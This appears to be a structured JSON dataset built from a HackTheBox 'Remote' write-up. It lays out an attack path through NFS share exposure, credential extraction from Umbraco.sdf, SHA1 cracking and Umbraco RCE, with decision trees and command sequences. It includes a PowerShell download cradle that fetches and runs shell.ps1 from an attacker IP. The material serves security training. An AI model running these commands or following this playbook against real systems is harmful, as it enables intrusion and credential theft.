@@ -1,0 +1,1003 @@
+{
+  "writeup_id": "Htb_Remote",
+  "scenario_fingerprint": {
+    "scenario_name": "windows_nfs_umbraco_cms_exploitation",
+    "primary_services": [
+      "nfs",
+      "http",
+      "smb",
+      "winrm",
+      "ftp"
+    ],
+    "port_signature": "21+80+111+135+139+445+2049+5985",
+    "service_combination": "nfs+http+smb+winrm",
+    "os_family": "windows_server",
+    "environment_type": "web_server",
+    "entry_vector": "nfs_credential_disclosure",
+    "privilege_path": "cms_rce_to_registry_credential_extraction",
+    "attack_complexity": "medium",
+    "estimated_time": "60-90 minutes",
+    "scenario_confidence": 0.92,
+    "distinguishing_factors": [
+      "nfs_on_windows",
+      "umbraco_cms",
+      "database_backup_exposure",
+      "teamviewer_credential_storage"
+    ],
+    "environmental_clues": [
+      "site_backups_nfs_share",
+      "sdf_database_files",
+      "umbraco_admin_panel",
+      "winrm_enabled"
+    ],
+    "similar_scenarios": [
+      "remote_htb_easy"
+    ],
+    "unique_aspects": [
+      "nfs_service_on_windows",
+      "umbraco_sdf_database",
+      "teamviewer_registry_decryption",
+      "authenticated_cms_rce"
+    ]
+  },
+  "success_patterns": {
+    "success_factors": [
+      {
+        "technique": "NFS_enumeration",
+        "success_reason": "NFS share exposed sensitive backup files without authentication",
+        "prerequisite_indicators": [
+          "nfs_service_running",
+          "showmount_accessible",
+          "mount_permissions_everyone"
+        ],
+        "recognition_patterns": [
+          "port 2049 open",
+          "showmount -e returns shares",
+          "backup or data directory names",
+          "everyone mount permissions"
+        ],
+        "failure_modes": [
+          "nfs_not_exposed",
+          "mount_permissions_restricted",
+          "no_sensitive_data_in_share"
+        ],
+        "environmental_factors": [
+          "windows_nfs_misconfiguration",
+          "backup_procedures_insecure",
+          "network_file_sharing_enabled"
+        ],
+        "success_probability": 0.92,
+        "typical_timeframe": "10-20 minutes"
+      },
+      {
+        "technique": "database_file_analysis",
+        "success_reason": "Umbraco.sdf contained plaintext usernames and SHA1 hashes",
+        "prerequisite_indicators": [
+          "sdf_files_present",
+          "database_files_accessible",
+          "cms_application_identified"
+        ],
+        "recognition_patterns": [
+          ".sdf file extensions",
+          "strings command reveals credentials",
+          "hash formats visible in output",
+          "email addresses and usernames"
+        ],
+        "failure_modes": [
+          "database_encrypted",
+          "no_database_files",
+          "hashes_too_complex"
+        ],
+        "environmental_factors": [
+          "umbraco_cms_default_storage",
+          "weak_hash_algorithms",
+          "unencrypted_database_backups"
+        ],
+        "success_probability": 0.85,
+        "typical_timeframe": "5-15 minutes"
+      },
+      {
+        "technique": "hash_cracking",
+        "success_reason": "SHA1 hash cracked to weak password 'baconandcheese'",
+        "prerequisite_indicators": [
+          "hash_format_identified",
+          "weak_password_policy",
+          "common_hash_algorithm"
+        ],
+        "recognition_patterns": [
+          "SHA1 hash format (40 hex chars)",
+          "hashcat mode 100",
+          "rockyou wordlist success",
+          "fast crack time"
+        ],
+        "failure_modes": [
+          "strong_password_used",
+          "salted_hashes",
+          "modern_hash_algorithms"
+        ],
+        "environmental_factors": [
+          "legacy_hash_algorithms",
+          "weak_password_policies",
+          "default_cms_configurations"
+        ],
+        "success_probability": 0.78,
+        "typical_timeframe": "1-30 minutes"
+      }
+    ],
+    "critical_discoveries": [
+      {
+        "discovery": "NFS share site_backups",
+        "discovery_method": "showmount -e enumeration",
+        "why_critical": "Exposed entire web application backup with database",
+        "how_to_recognize": [
+          "port 2049 open in nmap",
+          "showmount returns accessible shares",
+          "backup-related share names",
+          "everyone mount permissions"
+        ],
+        "follow_up_actions": [
+          "mount_nfs_share",
+          "enumerate_all_files",
+          "search_for_config_files",
+          "extract_database_files"
+        ]
+      },
+      {
+        "discovery": "Umbraco.sdf database file",
+        "discovery_method": "NFS share file enumeration",
+        "why_critical": "Contains admin credentials for CMS access",
+        "how_to_recognize": [
+          ".sdf file extension",
+          "App_Data directory location",
+          "strings output shows credentials",
+          "CMS-related file structure"
+        ],
+        "follow_up_actions": [
+          "strings_analysis",
+          "extract_password_hashes",
+          "identify_hash_formats",
+          "run_hashcat_cracking"
+        ]
+      },
+      {
+        "discovery": "admin@htb.local SHA1 hash",
+        "discovery_method": "strings analysis of database file",
+        "why_critical": "Provides admin access to Umbraco CMS",
+        "how_to_recognize": [
+          "admin username patterns",
+          "40-character hex strings",
+          "email format usernames",
+          "SHA1 hash algorithm indicators"
+        ],
+        "follow_up_actions": [
+          "crack_with_hashcat",
+          "test_umbraco_login",
+          "search_for_rce_exploits",
+          "enumerate_cms_functionality"
+        ]
+      }
+    ],
+    "escalation_keys": [
+      {
+        "privilege_level": "unauthenticated",
+        "escalation_method": "NFS_to_credential_access",
+        "why_possible": "NFS share exposed without authentication containing sensitive backups",
+        "recognition_signs": [
+          "nfs_service_enumeration",
+          "backup_directory_accessible",
+          "database_files_present",
+          "weak_file_permissions"
+        ],
+        "exploitation_path": "NFS Mount → Database Extraction → Hash Cracking → CMS Access"
+      },
+      {
+        "privilege_level": "cms_admin",
+        "escalation_method": "umbraco_rce_exploit",
+        "why_possible": "Authenticated RCE vulnerability in Umbraco CMS",
+        "recognition_signs": [
+          "umbraco_cms_identified",
+          "admin_credentials_obtained",
+          "known_rce_exploits_available",
+          "file_upload_functionality"
+        ],
+        "exploitation_path": "Admin Login → RCE Exploit → IIS Shell"
+      }
+    ]
+  },
+  "decision_tree": {
+    "decision_points": [
+      {
+        "step": 1,
+        "situation": "Found ports 21,80,111,135,139,445,2049,5985 open on Windows host",
+        "decision": "Prioritize NFS enumeration over typical Windows services",
+        "reasoning": "NFS (2049) is extremely uncommon on Windows, likely contains sensitive data",
+        "confidence": 0.95,
+        "alternatives": [
+          {
+            "option": "smb_enumeration",
+            "when": "if nfs fails"
+          },
+          {
+            "option": "web_enumeration",
+            "when": "parallel to nfs"
+          },
+          {
+            "option": "ftp_anonymous",
+            "when": "if other methods fail"
+          }
+        ],
+        "success_indicators": [
+          "nfs_shares_discovered",
+          "mountable_directories_found",
+          "sensitive_files_accessible"
+        ],
+        "next_decision": "mount_and_enumerate_nfs"
+      },
+      {
+        "step": 2,
+        "situation": "NFS share /site_backups accessible to everyone",
+        "decision": "Mount NFS share and search for configuration files with credentials",
+        "reasoning": "Site backups often contain database files, config files with passwords",
+        "confidence": 0.9,
+        "prerequisites": [
+          "nfs_service_accessible",
+          "mount_permissions_available"
+        ],
+        "success_indicators": [
+          "database_files_found",
+          "config_files_discovered",
+          "password_hashes_extracted"
+        ],
+        "failure_fallbacks": [
+          "web_application_enumeration",
+          "smb_enumeration"
+        ]
+      },
+      {
+        "step": 3,
+        "situation": "Found Umbraco.sdf database file in App_Data directory",
+        "decision": "Extract password hashes using strings command on .sdf file",
+        "reasoning": "SDF files contain plaintext strings that can reveal user credentials",
+        "confidence": 0.85,
+        "prerequisites": [
+          "database_file_accessible",
+          "strings_utility_available"
+        ],
+        "success_indicators": [
+          "user_accounts_discovered",
+          "password_hashes_extracted",
+          "hash_algorithm_identified"
+        ],
+        "next_decision": "crack_extracted_hashes"
+      },
+      {
+        "step": 4,
+        "situation": "Extracted SHA1 hash for admin@htb.local user",
+        "decision": "Crack SHA1 hash with hashcat and common wordlists",
+        "reasoning": "SHA1 is weak hashing algorithm, likely to crack with standard wordlists",
+        "confidence": 0.8,
+        "prerequisites": [
+          "hash_extracted",
+          "hashcat_available",
+          "wordlist_available"
+        ],
+        "success_indicators": [
+          "hash_cracked_successfully"
+        ],
+        "failure_fallbacks": [
+          "try_other_user_hashes",
+          "web_vulnerability_scanning"
+        ]
+      }
+    ],
+    "branching_logic": {
+      "if_nfs_accessible": {
+        "action": "mount_and_enumerate_thoroughly",
+        "tools": [
+          "showmount",
+          "mount",
+          "find",
+          "strings"
+        ],
+        "next_phase": "search_for_credentials_in_backups"
+      },
+      "if_database_files_found": {
+        "action": "extract_credentials_with_strings",
+        "tools": [
+          "strings",
+          "grep",
+          "cut"
+        ],
+        "next_phase": "identify_hash_types_and_crack"
+      },
+      "if_credentials_obtained": {
+        "action": "authenticate_to_cms_admin_panel",
+        "purpose": "gain_authenticated_access_for_code_execution",
+        "tools": [
+          "browser",
+          "burp",
+          "exploit_scripts"
+        ]
+      },
+      "if_cms_access_gained": {
+        "action": "exploit_authenticated_rce_vulnerability",
+        "tools": [
+          "custom_exploit",
+          "webshells"
+        ],
+        "next_phase": "establish_reverse_shell"
+      }
+    },
+    "optimization_rules": [
+      {
+        "rule": "always_prioritize_nfs_on_windows_hosts",
+        "reasoning": "extremely_rare_service_likely_contains_sensitive_data",
+        "applicability": "windows_hosts_with_nfs_service"
+      },
+      {
+        "rule": "use_strings_on_database_files_for_quick_credential_extraction",
+        "reasoning": "faster_than_proper_database_tools_for_initial_reconnaissance",
+        "applicability": "sdf_mdf_and_similar_database_files"
+      },
+      {
+        "rule": "check_app_data_directories_in_web_application_backups",
+        "reasoning": "commonly_contains_database_files_and_sensitive_configuration",
+        "applicability": "web_application_backup_directories"
+      },
+      {
+        "rule": "try_email_format_usernames_for_cms_login",
+        "reasoning": "modern_cms_systems_often_use_email_as_username",
+        "applicability": "cms_authentication_attempts"
+      }
+    ]
+  },
+  "applicability_rules": {
+    "technique_rules": [
+      {
+        "technique": "NFS_Mount_Enumeration",
+        "mitre_id": "T1135",
+        "required_services": [
+          "nfs",
+          "rpcbind",
+          "mountd"
+        ],
+        "required_ports": [
+          111,
+          2049
+        ],
+        "os_requirements": [
+          "windows",
+          "linux"
+        ],
+        "environmental_prerequisites": [
+          "nfs_service_running",
+          "rpcbind_accessible",
+          "exported_shares_exist"
+        ],
+        "success_indicators": [
+          "showmount_returns_exports",
+          "mount_succeeds",
+          "readable_files_present"
+        ],
+        "incompatible_with": [
+          "nfs_disabled",
+          "strict_export_permissions",
+          "network_isolation"
+        ],
+        "confidence_boosters": [
+          "everyone_export_permissions",
+          "sensitive_backup_directories",
+          "config_files_present"
+        ],
+        "typical_success_rate": 0.92,
+        "estimated_time": "2-5 minutes"
+      },
+      {
+        "technique": "Database_File_Extraction",
+        "mitre_id": "T1005",
+        "required_services": [
+          "file_access"
+        ],
+        "required_ports": [],
+        "os_requirements": [
+          "any"
+        ],
+        "environmental_prerequisites": [
+          "database_files_accessible",
+          "file_read_permissions",
+          "backup_directories_exposed"
+        ],
+        "success_indicators": [
+          "sdf_files_found",
+          "strings_reveals_credentials",
+          "hash_patterns_identified"
+        ],
+        "incompatible_with": [
+          "encrypted_database_files",
+          "no_file_access",
+          "empty_databases"
+        ],
+        "confidence_boosters": [
+          "umbraco_sdf_files",
+          "credential_patterns_in_strings",
+          "multiple_user_accounts"
+        ],
+        "typical_success_rate": 0.85,
+        "estimated_time": "5-10 minutes"
+      },
+      {
+        "technique": "Umbraco_CMS_Exploitation",
+        "mitre_id": "T1190",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443
+        ],
+        "os_requirements": [
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "umbraco_cms_detected",
+          "admin_login_accessible",
+          "valid_credentials_obtained"
+        ],
+        "success_indicators": [
+          "umbraco_admin_path_accessible",
+          "authentication_successful",
+          "code_execution_possible"
+        ],
+        "incompatible_with": [
+          "patched_umbraco_version",
+          "invalid_credentials",
+          "admin_interface_disabled"
+        ],
+        "confidence_boosters": [
+          "vulnerable_umbraco_version",
+          "default_admin_paths",
+          "authenticated_rce_exploits_available"
+        ],
+        "typical_success_rate": 0.78,
+        "estimated_time": "10-20 minutes"
+      },
+      {
+        "technique": "WinRM_Authentication",
+        "mitre_id": "T1021.006",
+        "required_services": [
+          "winrm",
+          "wsman"
+        ],
+        "required_ports": [
+          5985,
+          5986,
+          47001
+        ],
+        "os_requirements": [
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "winrm_service_enabled",
+          "valid_credentials_available",
+          "network_connectivity"
+        ],
+        "success_indicators": [
+          "winrm_ports_open",
+          "authentication_successful",
+          "powershell_session_established"
+        ],
+        "incompatible_with": [
+          "winrm_disabled",
+          "invalid_credentials",
+          "firewall_blocking"
+        ],
+        "confidence_boosters": [
+          "administrator_credentials",
+          "domain_user_credentials",
+          "winrm_default_configuration"
+        ],
+        "typical_success_rate": 0.89,
+        "estimated_time": "2-5 minutes"
+      }
+    ],
+    "environmental_detectors": {
+      "nfs_environment": {
+        "port_indicators": [
+          111,
+          2049
+        ],
+        "service_indicators": [
+          "nfs",
+          "rpcbind",
+          "mountd"
+        ],
+        "banner_indicators": [
+          "NFS",
+          "RPC"
+        ],
+        "confidence_threshold": 0.9
+      },
+      "umbraco_cms": {
+        "port_indicators": [
+          80,
+          443
+        ],
+        "service_indicators": [
+          "http",
+          "https"
+        ],
+        "technology_indicators": [
+          "umbraco",
+          "Umbraco.sdf",
+          "/Umbraco/"
+        ],
+        "confidence_threshold": 0.85
+      },
+      "windows_remote_management": {
+        "port_indicators": [
+          5985,
+          5986,
+          47001
+        ],
+        "service_indicators": [
+          "winrm",
+          "wsman"
+        ],
+        "banner_indicators": [
+          "Microsoft-HTTPAPI"
+        ],
+        "confidence_threshold": 0.88
+      },
+      "windows_smb": {
+        "port_indicators": [
+          139,
+          445
+        ],
+        "service_indicators": [
+          "smb",
+          "microsoft-ds",
+          "netbios-ssn"
+        ],
+        "banner_indicators": [
+          "SMB",
+          "Windows"
+        ],
+        "confidence_threshold": 0.92
+      }
+    },
+    "attack_prioritization": {
+      "high_priority": [
+        {
+          "attack": "nfs_mount_enumeration",
+          "when": "nfs_service_detected",
+          "reason": "often_exposes_sensitive_backups_and_configs"
+        },
+        {
+          "attack": "database_file_extraction",
+          "when": "backup_directories_accessible",
+          "reason": "high_probability_of_credential_discovery"
+        },
+        {
+          "attack": "winrm_authentication",
+          "when": "winrm_detected_and_creds_available",
+          "reason": "direct_shell_access_high_success_rate"
+        }
+      ],
+      "medium_priority": [
+        {
+          "attack": "umbraco_cms_exploitation",
+          "when": "umbraco_detected_and_authenticated",
+          "reason": "reliable_rce_but_requires_valid_credentials"
+        },
+        {
+          "attack": "smb_enumeration",
+          "when": "smb_service_detected",
+          "reason": "may_reveal_shares_but_often_requires_authentication"
+        }
+      ]
+    }
+  },
+  "technique_intelligence": {
+    "techniques": [
+      {
+        "name": "NFS Enumeration and Mount",
+        "mitre_id": "T1135",
+        "category": "discovery",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "showmount",
+            "command_template": "showmount -e {target_ip}",
+            "actual_command": "showmount -e 10.10.10.180",
+            "output_pattern": "/site_backups (everyone)",
+            "effectiveness_rating": 5,
+            "reliability": 0.98
+          },
+          {
+            "name": "mount",
+            "command_template": "mount -t nfs {target_ip}:{share_path} {local_mount_point}",
+            "actual_command": "mount -t nfs 10.10.10.180:/site_backups /mnt/",
+            "success_factors": [
+              "nfs_service_accessible",
+              "share_permissions_allow_mount"
+            ],
+            "effectiveness_rating": 5
+          }
+        ],
+        "prerequisites": [
+          "nfs_service_running",
+          "network_connectivity",
+          "mount_permissions_on_attacker_system"
+        ],
+        "success_indicators": [
+          "share_enumeration_successful",
+          "mount_operation_completes",
+          "file_system_accessible"
+        ],
+        "common_failures": [
+          "nfs_service_not_running",
+          "permission_denied_on_mount",
+          "network_connectivity_issues"
+        ],
+        "follow_up_techniques": [
+          "credential_harvesting",
+          "configuration_file_analysis",
+          "database_file_extraction"
+        ],
+        "time_investment": "2-5 minutes",
+        "skill_level": "beginner"
+      },
+      {
+        "name": "Database File Credential Extraction",
+        "mitre_id": "T1555.005",
+        "category": "credential_access",
+        "phase": "credential_access",
+        "tools_used": [
+          {
+            "name": "strings",
+            "command_template": "strings {database_file} | head",
+            "actual_command": "strings Umbraco.sdf | head",
+            "output_pattern": "admin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa",
+            "effectiveness_rating": 4,
+            "reliability": 0.85
+          }
+        ],
+        "prerequisites": [
+          "access_to_database_files",
+          "readable_file_permissions"
+        ],
+        "success_indicators": [
+          "credential_hashes_extracted",
+          "usernames_identified",
+          "hash_algorithm_identified"
+        ],
+        "common_failures": [
+          "encrypted_database_files",
+          "binary_format_not_readable",
+          "no_credentials_stored"
+        ],
+        "follow_up_techniques": [
+          "hash_cracking",
+          "credential_validation",
+          "privilege_escalation"
+        ],
+        "time_investment": "5-15 minutes",
+        "skill_level": "beginner"
+      },
+      {
+        "name": "SHA1 Hash Cracking",
+        "mitre_id": "T1110.002",
+        "category": "credential_access",
+        "phase": "credential_access",
+        "tools_used": [
+          {
+            "name": "hashcat",
+            "command_template": "hashcat -m 100 {hash_file} {wordlist} --force",
+            "actual_command": "hashcat -m 100 admin.sha1 /usr/share/wordlists/rockyou.txt --force",
+            "output_pattern": "b8be16afba8c314ad33d812f22a04991b90e2aaa:baconandcheese",
+            "effectiveness_rating": 4,
+            "reliability": 0.75
+          }
+        ],
+        "prerequisites": [
+          "extracted_password_hashes",
+          "wordlist_available",
+          "sufficient_compute_resources"
+        ],
+        "success_indicators": [
+          "hash_cracked_successfully",
+          "plaintext_password_recovered",
+          "reasonable_crack_time"
+        ],
+        "common_failures": [
+          "strong_password_resists_cracking",
+          "insufficient_wordlist_coverage",
+          "hardware_limitations"
+        ],
+        "follow_up_techniques": [
+          "credential_validation",
+          "cms_authentication",
+          "privilege_escalation"
+        ],
+        "time_investment": "5-60 minutes",
+        "skill_level": "beginner"
+      },
+      {
+        "name": "Umbraco CMS Authentication RCE",
+        "mitre_id": "T1190",
+        "category": "initial_access",
+        "phase": "exploitation",
+        "tools_used": [
+          {
+            "name": "custom_exploit_script",
+            "command_template": "python umbraco_rce.py",
+            "actual_command": "python umbraco_rce_ping.py",
+            "success_factors": [
+              "valid_cms_credentials",
+              "vulnerable_umbraco_version",
+              "xslt_processing_enabled"
+            ],
+            "effectiveness_rating": 5,
+            "reliability": 0.9
+          }
+        ],
+        "prerequisites": [
+          "valid_cms_credentials",
+          "vulnerable_umbraco_installation",
+          "network_access_to_cms"
+        ],
+        "success_indicators": [
+          "code_execution_achieved",
+          "system_commands_executed",
+          "reverse_shell_established"
+        ],
+        "common_failures": [
+          "patched_cms_version",
+          "invalid_credentials",
+          "network_filtering"
+        ],
+        "follow_up_techniques": [
+          "privilege_escalation",
+          "persistence_establishment",
+          "lateral_movement"
+        ],
+        "time_investment": "15-30 minutes",
+        "skill_level": "intermediate"
+      },
+      {
+        "name": "PowerShell Download Cradle",
+        "mitre_id": "T1059.001",
+        "category": "execution",
+        "phase": "exploitation",
+        "tools_used": [
+          {
+            "name": "powershell",
+            "command_template": "powershell -c iex(new-object net.webclient).downloadstring('http://{attacker_ip}/{payload_file}')",
+            "actual_command": "powershell -c iex(new-object net.webclient).downloadstring('http://10.10.14.19/shell.ps1')",
+            "output_pattern": "reverse_shell_connection",
+            "effectiveness_rating": 5,
+            "reliability": 0.95
+          }
+        ],
+        "prerequisites": [
+          "powershell_available_on_target",
+          "outbound_http_connectivity",
+          "payload_hosted_on_attacker_server"
+        ],
+        "success_indicators": [
+          "payload_downloaded_successfully",
+          "payload_executed_in_memory",
+          "reverse_shell_established"
+        ],
+        "common_failures": [
+          "powershell_execution_policy_restrictions",
+          "network_egress_filtering",
+          "antivirus_detection"
+        ],
+        "follow_up_techniques": [
+          "persistence_establishment",
+          "privilege_escalation",
+          "credential_harvesting"
+        ],
+        "time_investment": "5-10 minutes",
+        "skill_level": "intermediate"
+      }
+    ],
+    "tool_effectiveness": [
+      {
+        "tool": "showmount",
+        "use_case": "nfs_share_enumeration",
+        "effectiveness_rating": 5,
+        "reliability": 0.98,
+        "learning_curve": "low",
+        "essential_for": [
+          "nfs_environments"
+        ],
+        "alternatives": [
+          "manual_rpc_enumeration",
+          "nmap_nfs_scripts"
+        ],
+        "best_practices": [
+          "always_check_nfs_when_port_2049_open",
+          "enumerate_all_available_shares",
+          "check_mount_permissions_before_attempting"
+        ]
+      },
+      {
+        "tool": "hashcat",
+        "use_case": "password_hash_cracking",
+        "effectiveness_rating": 4,
+        "reliability": 0.75,
+        "learning_curve": "medium",
+        "essential_for": [
+          "credential_recovery"
+        ],
+        "alternatives": [
+          "john_the_ripper",
+          "online_hash_crackers"
+        ],
+        "best_practices": [
+          "identify_hash_type_before_cracking",
+          "use_appropriate_wordlists",
+          "consider_rule_based_attacks_for_complex_passwords"
+        ]
+      },
+      {
+        "tool": "strings",
+        "use_case": "binary_file_analysis",
+        "effectiveness_rating": 4,
+        "reliability": 0.85,
+        "learning_curve": "low",
+        "essential_for": [
+          "file_analysis",
+          "credential_extraction"
+        ],
+        "alternatives": [
+          "hexdump",
+          "binwalk",
+          "specialized_database_tools"
+        ],
+        "best_practices": [
+          "pipe_output_through_grep_for_specific_patterns",
+          "use_head_tail_to_focus_on_relevant_sections",
+          "combine_with_other_analysis_tools"
+        ]
+      }
+    ],
+    "command_sequences": [
+      {
+        "sequence_name": "nfs_to_cms_compromise",
+        "steps": [
+          {
+            "step": 1,
+            "command": "showmount -e 10.10.10.180",
+            "purpose": "Enumerate NFS shares",
+            "expected_output": "/site_backups (everyone)"
+          },
+          {
+            "step": 2,
+            "command": "mount -t nfs 10.10.10.180:/site_backups /mnt/",
+            "purpose": "Mount NFS share locally",
+            "expected_output": "Successful mount operation"
+          },
+          {
+            "step": 3,
+            "command": "strings /mnt/App_Data/Umbraco.sdf | head",
+            "purpose": "Extract credentials from database file",
+            "expected_output": "admin@htb.local hash and other user data"
+          },
+          {
+            "step": 4,
+            "command": "hashcat -m 100 admin.sha1 /usr/share/wordlists/rockyou.txt --force",
+            "purpose": "Crack extracted SHA1 hash",
+            "expected_output": "Password: baconandcheese"
+          },
+          {
+            "step": 5,
+            "command": "python umbraco_rce.py",
+            "purpose": "Execute RCE exploit against Umbraco CMS",
+            "expected_output": "Code execution and reverse shell"
+          }
+        ],
+        "success_rate": 0.82,
+        "typical_duration": "20-45 minutes"
+      }
+    ]
+  },
+  "metadata": {
+    "basic_metadata": {
+      "name": "Remote",
+      "difficulty": "Easy",
+      "os": "Windows",
+      "platform": "HackTheBox",
+      "release_date": "2020-03-21",
+      "author": "mrb3n",
+      "estimated_time": "60-90 minutes"
+    },
+    "intelligence_metadata": {
+      "attack_complexity": "medium",
+      "skill_level_required": "intermediate",
+      "primary_attack_vectors": [
+        "nfs_enumeration",
+        "cms_exploitation",
+        "registry_credential_extraction"
+      ],
+      "key_vulnerabilities": [
+        "exposed_nfs_share",
+        "umbraco_rce",
+        "teamviewer_credential_storage"
+      ],
+      "environment_type": "windows_workstation_with_services",
+      "real_world_relevance": "high",
+      "learning_value": [
+        "nfs_security",
+        "cms_exploitation",
+        "windows_credential_extraction",
+        "teamviewer_forensics"
+      ],
+      "prerequisite_knowledge": [
+        "nfs_basics",
+        "hash_cracking",
+        "windows_registry",
+        "powershell"
+      ]
+    },
+    "categorization": {
+      "primary_category": "web_application_security",
+      "subcategories": [
+        "file_system_exposure",
+        "cms_exploitation",
+        "credential_extraction"
+      ],
+      "attack_types": [
+        "information_disclosure",
+        "remote_code_execution",
+        "credential_access"
+      ],
+      "defensive_lessons": [
+        "secure_nfs_configuration",
+        "cms_hardening",
+        "secure_credential_storage",
+        "service_account_management"
+      ]
+    },
+    "similarity_markers": {
+      "similar_boxes": [
+        "Bastard",
+        "Grandpa",
+        "Optimum"
+      ],
+      "similarity_reasons": [
+        "cms_exploitation",
+        "windows_target",
+        "service_misconfiguration"
+      ],
+      "unique_aspects": [
+        "nfs_exposure",
+        "teamviewer_credential_extraction",
+        "multi_stage_credential_discovery"
+      ],
+      "difficulty_factors": [
+        "multiple_attack_vectors",
+        "custom_decryption_script_required",
+        "registry_analysis"
+      ]
+    }
+  },
+  "extraction_metadata": {
+    "parse_date": "2025-07-05T03:22:57.456001",
+    "original_file": "0xdf_writeups/Htb Remote.md",
+    "content_length": 24932,
+    "extraction_version": "2.0-claude",
+    "model_used": "claude-sonnet-4-20250514"
+  },
+  "intelligence_confidence": 1.0,
+  "quality_breakdown": {
+    "scenario_uniqueness": 1.0,
+    "success_logic_clarity": 1.0,
+    "applicability_completeness": 1.0,
+    "decision_tree_depth": 1.0,
+    "technique_actionability": 1.0
+  }
+}
